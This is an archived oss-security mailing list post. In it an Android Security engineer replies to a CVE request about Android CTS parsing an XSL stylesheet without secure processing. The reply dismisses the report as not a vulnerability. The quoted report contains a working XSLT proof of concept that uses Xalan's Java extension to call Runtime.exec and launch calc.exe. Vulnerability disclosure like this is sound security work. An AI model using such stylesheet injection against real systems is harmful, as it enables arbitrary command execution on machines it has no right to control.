  oss-security - Re: CVE request: remote code execution in Android CTS            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Sun, 19 Oct From: Nick Kralevich <nnk@...gle.com> To: oss-security@...ts.openwall.com Cc: fulldisclosure@...lists.org Subject: Re: CVE request: remote code execution in Android CTS  Nick from the Android Security team here.  In the future, please feel free to send these kinds of reports to security@...roid.com. Please see http://developer.android.com/guide/faq/security.html#issue for contact information.  Android's Compatibility Test Suite (CTS) is an executable software package intended to be downloaded and run from your computer. Please see https://source.android.com/compatibility/cts-intro.html for more information.  The files within the software package are not intended to be modified.  If I'm reading your report correctly, you're claiming that an attacker who has the ability to locally modify a software package has the ability to get code execution. This isn't a security bug. What you're describing is another example of . You're on the wrong side of the airtight hatch.  If you are aware of ways to exploit this functionality that doesn't involve tricking the user into replacing a file, please feel free to contact us at security@...roid.com.  -- Nick  On Sun, Oct 19, at AM, Lord Tuskington <l.tuskington@...il.com> wrote: > CTS parses api-coverage.xsl without providing the FEATURE_SECURE_PROCESSING > option. See lines of > cts/tools/cts-api-coverage/src/com/android/cts/apicoverage/HtmlReport.java: > > InputStream xsl = > CtsApiCoverage.class.getResourceAsStream("/api-coverage.xsl"); > StreamSource xslSource = new StreamSource(xsl); > TransformerFactory factory = TransformerFactory.newInstance(); > Transformer transformer = factory.newTransformer(xslSource); > > StreamSource xmlSource = new StreamSource(xmlIn); > StreamResult result = new StreamResult(out); > transformer.transform(xmlSource, result); > > An attacker who is able to control api-coverage.xsl could inject arbitrary > code into it, which would be executed. For example: > > <xsl:stylesheet version="1.0" > > xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" > xmlns:str="http://xml.apache.org/xalan/java/java.lang.String" >> > <xsl:output method="text"/> >     <xsl:template match="/"> >        <xsl:variable name="Command"><![CDATA[calc.exe]]></xsl:variable> >        <xsl:variable name="RT" select="rt:getRuntime()"/> >        <xsl:variable name="proc" select="rt:exec($RT, $Command)"/> >        <xsl:text>Process: </xsl:text><xsl:value-of select="$proc"/> >     </xsl:template> > </xsl:stylesheet> > > Would pop a calc. This crosses a trust boundary because an attacker could > provide an XSL stylesheet that, for example, has enhanced visual layout. A > person consuming that stylesheet would assume it could not possibly contain > arbitrary code that would be executed, as it's just a stylesheet. The XSL > extensions to execute code should be disabled by passing > FEATURE_SECURE_PROCESSING. > > Regards > > Lord Tuskington > > Chief Financial Pinniped > > TuskCorp    --  Nick Kralevich | Android Security | nnk@...gle.com |  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      